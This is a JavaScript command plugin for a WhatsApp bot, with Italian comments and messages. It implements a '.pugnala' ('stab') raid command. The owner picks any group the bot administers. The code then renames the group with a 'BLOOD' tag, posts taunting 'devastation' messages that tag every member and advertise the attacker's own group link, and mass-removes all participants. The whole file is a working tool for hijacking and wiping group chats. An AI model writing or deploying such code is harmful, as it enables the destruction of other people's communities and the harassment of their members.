let handler = async (m, { conn, text, isBotAdmin, command }) => {
    const ownerJids = global.owner.map(o => o[0] + '@s.whatsapp.net');
    if (!ownerJids.includes(m.sender)) return;

    // --- LOGICA CHAT PRIVATA (LISTA GRUPPI) ---
    if (!m.isGroup) {
        let getGroups = await conn.groupFetchAllParticipating();
        let groups = Object.values(getGroups);
        
        if (groups.length === 0) return m.reply("❌ Il bot non è in alcun gruppo.");

        // Se l'utente ha scritto ".pugnala [numero]"
        if (text) {
            let index = parseInt(text) - 1;
            if (isNaN(index) || !groups[index]) return m.reply("❌ Numero non valido. Scegli un numero dalla lista.");
            
            let targetGroup = groups[index];
            await m.reply(`⚔️ Avvio attacco al gruppo: *${targetGroup.subject}*...`);
            
            // Richiama la funzione internamente per il gruppo scelto
            return handler(m, { conn, text: '', isBotAdmin: true, command, isTargeted: targetGroup.id });
        }

        // Mostra la lista dei gruppi
        let txt = "🩸 *Scegli il gruppo da devastare:*\n\n";
        txt += groups.map((g, i) => `[${i + 1}] ${g.subject}`).join('\n');
        txt += `\n\n👉 Scrivi *.${command} [numero]* per svuotarne uno.`;
        
        return m.reply(txt);
    }

    // --- LOGICA GRUPPO (ESECUZIONE) ---
    let chat = m.isGroup ? m.chat : (arguments[1].isTargeted || null);
    if (!chat) return;

    if (!isBotAdmin && m.isGroup) return m.reply("❌ Il bot deve essere admin per eseguire il comando.");

    const botId = conn.user.id.split(':')[0] + '@s.whatsapp.net';

    try {
        // 🔹 CAMBIO NOME GRUPPO
        let metadata = await conn.groupMetadata(chat);
        let participants = metadata.participants;
        let oldName = metadata.subject;
        let newName = `${oldName} | 𝚂𝚅𝚃 𝙱𝚢 𝐁𝐋𝐎𝐎𝐃`;
        
        await conn.groupUpdateSubject(chat, newName);

        let usersToRemove = participants
            .map(p => p.id)
            .filter(jid => 
                jid && 
                jid !== botId && 
                !ownerJids.includes(jid)
            );

        if (!usersToRemove.length) return m.reply("❌ Nessun utente da rimuovere (esclusi bot e owner).");

        // Messaggi di devastazione
        await conn.sendMessage(chat, {
            text: "𝐁𝐥𝐨𝐨𝐝 𝐞̀ 𝐚𝐫𝐫𝐢𝐯𝐚𝐭𝐨 𝐢𝐧 𝐜𝐢𝐫𝐜𝐨𝐥𝐚𝐳𝐢𝐨𝐧𝐞, 𝐞 𝐪𝐮𝐞𝐬𝐭𝐨 𝐬𝐢𝐠𝐧𝐢𝐟𝐢𝐜𝐚 𝐬𝐨𝐥𝐨 𝐮𝐧𝐚 𝐜𝐨𝐬𝐚, 𝐃𝐄𝐕𝐀𝐒𝐓𝐎. 𝐈𝐥 𝐝𝐞𝐯𝐚𝐬𝐭𝐨 𝐜𝐡𝐞 𝐚𝐦𝐦𝐚𝐳𝐳𝐞𝐫𝐚̀ 𝐭𝐮𝐭𝐭𝐢 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐜𝐨𝐦𝐞 𝐮𝐧𝐚 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐚, 𝐩𝐫𝐨𝐩𝐫𝐢𝐨 𝐪𝐮𝐞𝐥𝐥𝐚 𝐜𝐡𝐞 𝐯𝐢 𝐝𝐚𝐫𝐚̀."
        });

        await conn.sendMessage(chat, {
            text: "𝐀𝐯𝐞𝐭𝐞 𝐚𝐯𝐮𝐭𝐨 𝐥' 𝐨𝐧𝐨𝐫𝐞 𝐝𝐢 𝐞𝐬𝐬𝐞𝐫𝐞 𝐬𝐭𝐚𝐭𝐢 𝐩𝐮𝐠𝐧𝐚𝐥𝐚𝐭𝐢 𝐝𝐚 𝐁𝐥𝐨𝐨𝐝, 𝐯𝐢 𝐚𝐬𝐩𝐞𝐭𝐭𝐢𝐚𝐦𝐨 𝐭𝐮𝐭𝐭𝐢 𝐪𝐮𝐚:\n\nhttps://chat.whatsapp.com/HsPqgzLHm25LBVcEd7Ldri",
            mentions: participants.map(p => p.id)
        });

        // Hard Wipe
        await conn.groupParticipantsUpdate(chat, usersToRemove, 'remove');
        
        if (!m.isGroup) m.reply("✅ Devastazione completata con successo.");

    } catch (e) {
        console.error(e);
        await m.reply("❌ Errore durante l'esecuzione: " + e.message);
    }
};

handler.command = ['pugnala'];
handler.owner = true; // Solo l'owner può usarlo

export default handler;
